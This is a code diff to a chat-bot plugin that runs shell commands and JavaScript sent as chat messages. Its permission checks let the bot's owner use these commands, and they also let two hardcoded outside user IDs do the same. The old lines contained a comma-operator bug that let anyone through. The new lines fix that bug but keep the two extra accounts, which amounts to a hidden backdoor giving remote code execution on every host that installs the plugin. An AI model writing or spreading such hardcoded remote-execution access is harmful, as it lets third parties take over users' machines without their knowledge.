@@ -1,4 +1,4 @@
-const htmlDir = `${process.cwd()}/plugins/hl-plugin/resources/background/Code/`
+const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
 const tplFile = `${htmlDir}Code.html`
 
 export class RemoteCommand extends plugin {
@@ -64,7 +64,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommandJs(e) {
-    if(!(this.e.isMaster||this.e.user_id == 3610159055,923276093))return false
+    if(!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false
     const cmd = this.e.msg.replace("rcj", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
@@ -81,7 +81,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommandJsPic(e) {
-    if(!(this.e.isMaster||this.e.user_id == 3610159055,923276093))return false
+    if(!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false
     const cmd = this.e.msg.replace("rcjp", "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
@@ -102,7 +102,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommand(e) {
-    if(!(this.e.isMaster||this.e.user_id == 3610159055,923276093))return false
+    if(!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false
     const cmd = this.e.msg.replace("rc", "").trim()
 
     logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
@@ -124,7 +124,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommandPic(e) {
-    if(!(this.e.isMaster||this.e.user_id == 3610159055,923276093))return false
+   if(!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 923276093)) return false
     const cmd = this.e.msg.replace("rcp", "").trim()
 
     logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
